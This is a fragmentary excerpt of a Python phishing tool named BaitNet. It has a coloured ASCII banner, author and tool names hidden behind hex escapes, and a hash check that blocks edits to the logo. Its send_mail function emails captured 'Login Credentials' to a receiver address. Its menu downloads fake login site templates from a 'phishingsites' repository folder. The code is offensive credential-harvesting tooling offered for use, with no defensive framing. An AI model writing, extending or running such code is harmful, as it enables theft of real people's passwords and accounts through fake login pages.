...
{red}.______        ___       __  .___________.   .__   __.  _______ .___________.
{cyan}|   _  \      /   \     |  | |           |   |  \ |  | |   ____||           |
{yellow}|  |_)  |    /  ^  \    |  | `---|  |----`   |   \|  | |  |__   `---|  |----`
{blue}|   _  <    /  /_\  \   |  |     |  |        |  . `  | |   __|      |  |     
{red}|  |_)  |  /  _____  \  |  |     |  |        |  |\   | |  |____     |  |     
{yellow}|______/  /__/     \__\ |__|     |__|        |__| \__| |_______|    |__|     


                                       {yellow}{" "*35}[{blue}v{version[:3]}{yellow}]
                                       {cyan}{" "*36}[{blue}By {green}\x56\x61\x69\x62\x68\x61\x76 \x61\x6E\x64 \x56\x69\x76\x65\x6B{cyan}]
"""
...
repo_url = "https://gitlab.com/vaibhav2195/Baitnet"
...
def show_file_data(file):
    ...
    cprint(
        Panel(
            text.strip(),
            title="[bold green]\x42\x61\x69\x74\x4e\x65\x74[/][cyan] Data[/]", 
            title_align="left",
            border_style="blue",
        )
    )
...
if sha256(logo.encode("utf-8")).hexdigest() != "885cdc00e018508cb9820c1063f27b7c2ae74ab7518f6a10e177c84125105935":
...
def send_mail(msg):
    ...
    message = f"From: {email}\nTo: {receiver}\nSubject: \x42\x61\x69\x74\x4e\x65\x74 Login Credentials\n\n{msg}"
    try:
        internet()
...
def about():
    clear()
    print(f"{red}{yellow}[{purple}ToolName{yellow}]      {cyan} : {yellow}[{green}\x42\x61\x69\x74\x4e\x65\x74{yellow}] ")
    print(f"{red}{yellow}[{purple}Version{yellow}]       {cyan} : {yellow}[{green}{version}{yellow}] ")
    print(f"{red}{yellow}[{purple}Author{yellow}]        {cyan} : {yellow}[{green}\x56\x61\x69\x62\x68\x61\x76 \x61\x6E\x64 \x56\x69\x76\x65\x6B{yellow}] ")
    print(f"{red}{yellow}[{purple}Github{yellow}]        {cyan} : {yellow}[{green}https://github.com/vaibhav2195{purple}{yellow}] ")
    print(f"{red}{yellow}[{purple}Email{yellow}]         {cyan} : {yellow}[{green}vaibhav.sharma.2195@gmail.com{yellow}] ")
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}x{green}]{yellow} Main Menu       \n")
    inp = input(f"\n{ask}Choose your option: {green}")
    if inp == "0":
        pexit()
...
def requirements():
    ...
    for retry in range(2):
        ...
        if termux and retry == 1:
            print(f"\n{error}You haven't allowed storage permission for termux. Closing \x42\x61\x69\x74\x4e\x65\x74!\n")
            sleep(2)
            pexit()
...
def secondary_menu(sites, name):
    ...
    if customdir is None:
        ...
        if not isdir(site):
            ...
            download(f"https://github.com/vaibhav2195/webtemplates/tree/main/phishingsites/{folder}.zip", "site.zip")
